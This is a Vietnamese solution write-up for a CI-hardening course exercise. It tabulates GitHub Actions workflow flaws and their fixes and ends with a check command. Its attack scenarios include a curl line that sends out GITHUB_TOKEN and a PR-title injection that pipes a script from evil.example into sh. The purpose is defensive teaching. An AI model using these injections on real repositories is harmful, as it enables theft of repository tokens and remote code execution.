# Lời giải: gia cố workflow CI của worker

Bản đã sửa nằm ở `.github/workflows/worker-ci.yml` cạnh tệp này. Mỗi thay đổi tương ứng một kịch bản cụ thể.

| Lỗ hổng trong starter | Kịch bản xấu | Sửa |
| --- | --- | --- |
| `pull_request_target` cộng bước `git fetch` code của PR | Người lạ mở PR từ fork, sửa `tests/test_worker.py` thành `import os; os.system("curl ... $GITHUB_TOKEN")`. Workflow chạy code đó với token của repo gốc (đang `write-all`) và mọi secret: họ đẩy được commit, tạo release, sửa package | Đổi sang `pull_request`. PR từ fork nhận token chỉ đọc và không có secret; bỏ hẳn bước fetch vì checkout của `pull_request` đã lấy merge commit của PR |
| `permissions: write-all` | Bất kỳ bước nào (hay action của bên thứ ba) bị chiếm đều cầm token ghi repo, package, release | `permissions: contents: read`; job cần gì thì nâng riêng cho job đó |
| `${{ github.event.pull_request.title }}` và `${{ github.head_ref }}` trong `run:` | Tiêu đề PR `x"; curl -sSf https://evil.example/p.sh \| sh; echo "` được chèn vào văn bản script trước khi bash chạy | Đưa qua `env:` (`PR_TITLE`, `PR_BRANCH`) rồi `printf '%s'`. Tên nhánh cũng do người gửi PR đặt, nên cũng là dữ liệu không tin cậy |
| `actions/checkout@v7`, `actions/upload-artifact@v7` | Tag là con trỏ dời được. Tài khoản maintainer bị chiếm, tag bị dời sang commit độc: mọi repo dùng `@v7` chạy mã đó ở lần chạy sau (đúng chuỗi sự cố `tj-actions/changed-files` tháng 3 năm 2025) | Ghim SHA đủ 40 ký tự; phiên bản ghi trong `name:` của bước để người đọc biết. Dependabot (`package-ecosystem: github-actions`) mở PR khi có bản mới |
| `actions/checkout` mặc định `persist-credentials: true` | Token được ghi vào `.git/config` của workspace; bước sau (hay artifact upload cả thư mục) đọc được | `persist-credentials: false`; job không cần push gì |
| Không `timeout-minutes` | Test treo (deadlock, chờ mạng) chiếm runner 6 giờ, chặn hàng đợi | `timeout-minutes: 15` |
| Không `concurrency` | 5 push liên tiếp lên một PR là 5 lần chạy song song | `group: worker-ci-${{ github.ref }}`, `cancel-in-progress: true` |
| `push:` không giới hạn nhánh | Mỗi push lên nhánh tính năng chạy CI một lần, mở PR từ nhánh đó chạy thêm lần nữa | `push: branches: [main]`; nhánh tính năng được kiểm qua `pull_request` |

## Những gì không có trong bài nhưng nên làm ở repo thật

- Bật "Require approval for all outside collaborators" cho workflow của fork, và chạy self-hosted runner **không bao giờ** cho
  repo public: runner tự host giữ trạng thái giữa các job.
- `CODEOWNERS` cho `.github/workflows/` để mọi thay đổi workflow phải có platform team duyệt.
- Ruleset bắt buộc action ghim SHA (tuỳ chọn "Require actions to be pinned to a full-length commit SHA" ở cấp tổ chức).
- Chạy `zizmor` hay `actionlint` trong CI cho chính thư mục `.github/workflows/`.

## Kiểm sau khi sửa

```bash
EX=tracks/devops/modules/07-cicd-artifacts/exercises/basic/02-workflow-hardening &&
actionlint "$EX/starter/.github/workflows/worker-ci.yml" &&
nice -n 15 uv run pytest "$EX" -q
```

Trên máy viết bài: `4 passed` trong khoảng 20 giây.
